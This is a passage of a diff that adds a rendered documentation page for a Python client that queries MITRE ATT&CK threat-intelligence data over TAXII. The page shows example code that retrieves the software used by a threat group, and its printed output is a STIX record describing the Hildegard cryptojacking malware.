x_mitre_is_subtechnique=False, x_mitre_permissions_required=[&#39;User&#39;], x_mitre_platforms=[&#39;Containers&#39;], x_mitre_version=&#39;1.0&#39;)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-software-used-by-group-taxii">
+<h2>Get Software Used by Group (TAXII)<a class="headerlink" href="#get-software-used-by-group-taxii" title="Permalink to this headline">¶</a></h2>
+<p>You can retrieve every software (malware or tool) mapped to a specific Group STIX object</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">groups</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_groups</span><span class="p">()</span>
+<span class="n">one_group</span> <span class="o">=</span> <span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">group_software</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_software_used_by_group</span><span class="p">(</span><span class="n">one_group</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">group_software</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Malware(type=&#39;malware&#39;, id=&#39;malware--40a1b8ec-7295-416c-a6b1-68181d86f120&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2021-04-07T18:07:47.604Z&#39;, modified=&#39;2021-10-16T01:49:39.189Z&#39;, name=&#39;Hildegard&#39;, description=&#39;[Hildegard](https://attack.mitre.org/software/S0601) is malware that targets misconfigured kubelets for initial access and runs cryptocurrency miner operations. The malware was first observed in January 2021. The TeamTNT activity group is believed to be behind [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware)&#39;, revoked=False, labels=[&#39;malware&#39;], external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/software/S0601&#39;, external_id=&#39;S0601&#39;), ExternalReference(source_name=&#39;Unit 42 Hildegard Malware&#39;, description=&#39;Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021.&#39;, url=&#39;https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_aliases=[&#39;Hildegard&#39;], x_mitre_contributors=[&#39;Center for Threat-Informed Defense (CTID)&#39;], x_mitre_platforms=[&#39;Linux&#39;, &#39;Containers&#39;, &#39;IaaS&#39;], x_mitre_version=&#39;1.1&#39;)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./playground"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            
+                <!-- Previous / next buttons -->
+<div class='prev-next-area'> 
+    <a class='left-prev' id="prev-link" href="7-Export_Groups_Navigator_Layers.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Exporting ATT&amp;CK Group Navigator Layers</p>
+        </div>
+    </a>
+</div>
+            
+        </div>
+    </div>
+    <footer class="footer">
+  <p>
+    
+      By Roberto Rodriguez @Cyb3rWard0g<br/>
+    
+        &copy; Copyright 2021.<br/>
+  </p>
+</footer>
+</main>
+
+
+      </div>
+    </div>
+  
+  <script src="../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>
+
+  </body>
+</html>
